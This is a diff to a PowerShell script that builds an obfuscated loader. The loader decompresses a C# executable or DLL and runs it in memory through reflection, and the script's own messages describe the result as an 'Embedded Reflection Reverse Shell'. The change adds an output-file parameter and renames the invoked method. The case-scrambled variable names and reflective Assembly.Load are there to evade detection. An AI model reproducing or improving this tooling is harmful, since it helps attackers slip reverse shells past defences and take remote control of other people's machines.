@@ -1,4 +1,5 @@
-param([parameter(mandatory)] $File)
+param([parameter(mandatory)] $File,
+    [parameter(mandatory)] $OutputFile)
 
 $bytes = [System.IO.File]::ReadAllBytes($File)
 [System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
@@ -16,7 +17,7 @@ $reflection_code_exe = @"
 `$dEcoMPReSSEd.copYto( `$outPUt )
 [BYte[]]`$ByTEOuTarrAy = `$OUtPUT.toarrAY()
 `$RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load(`$bYTeOUTArraY)
-[thanos.black_order]::Main(0)
+[thanos.black_order]::Main()
 "@
 
 $reflection_code_dll = @"
@@ -27,18 +28,18 @@ $reflection_code_dll = @"
 [BYte[]]`$ByTEOuTarrAy = `$OUtPUT.toarrAY()
 `$tesaract = [sySTeM.REfLecTIOn.ASSEmBlY]::load(`$bYTeOUTArraY)
 `$wakanda = `$tesaract.GetType("thanos.black_order")
-`$thanos = `$wakanda.GetMethod("sanctuary2")
+`$thanos = `$wakanda.GetMethod("Main")
 `$thanos.Invoke(0, `$null)
 "@
 
 if($file.Substring($file.Length - 3, 3) -eq "exe"){
     Write-Host "[+] Written the C# exe Embedded Reflection Reverse Shell into rev.ps1"
-    $reflection_code_exe | Out-File rev.ps1
+    $reflection_code_exe | Out-File $OutputFile
 }
 
 elseif($file.Substring($file.Length - 3, 3) -eq "dll"){
     Write-Host "[+] Written the C# dll Embedded Reflection Reverse Shell into rev.ps1"
-    $reflection_code_dll | Out-File rev.ps1
+    $reflection_code_dll | Out-File $OutputFile
 }
 
 else{
